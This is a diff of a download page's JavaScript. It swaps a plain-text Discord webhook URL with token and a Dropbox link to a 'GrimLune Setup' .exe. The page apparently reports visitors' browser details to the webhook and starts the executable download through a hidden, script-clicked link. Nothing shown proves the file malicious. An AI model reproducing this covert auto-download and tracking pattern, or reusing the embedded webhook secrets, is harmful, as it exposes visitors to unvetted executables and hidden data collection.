@@ -149,7 +149,7 @@ document.addEventListener('click', (e) => {
 
 
 // ---- DISCORD WEBHOOK ----
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1501651386625036452/-_wH-JjNGa45Pa0TNHEPnHBBeeRyd4EBX_0JxfvhwxNvv4uNEKZ5k_skPBoPtIaeotYd';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1503209486649917494/MCw7JciZ-8smfaQjgFLMKvaRvP6NOecWl0suXLI5Rmg6D5dLAJeO_8vK7HdPHkU4Hke3';
 
 function getBrowserName() {
     const ua = navigator.userAgent;
@@ -275,8 +275,8 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'https://www.dropbox.com/scl/fi/yyos5rhpd4xjw0m994c0y/GrimLune-Setup-3.0.0.exe?rlkey=xte7a3hh4chbmic2pzcr2zwd7&st=leh2e5yx&dl=1';
-    a.download = 'GrimLune Setup 3.0.0.exe';
+    a.href = 'https://www.dropbox.com/scl/fi/4hifmbm7ufh3cv3wrhdgi/GrimLune-1.0.0.exe?rlkey=m986uz3zds63c1kauli6269o8&st=02lf0eeu&dl=1';
+    a.download = 'GrimLune Setup 1.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
     a.click();
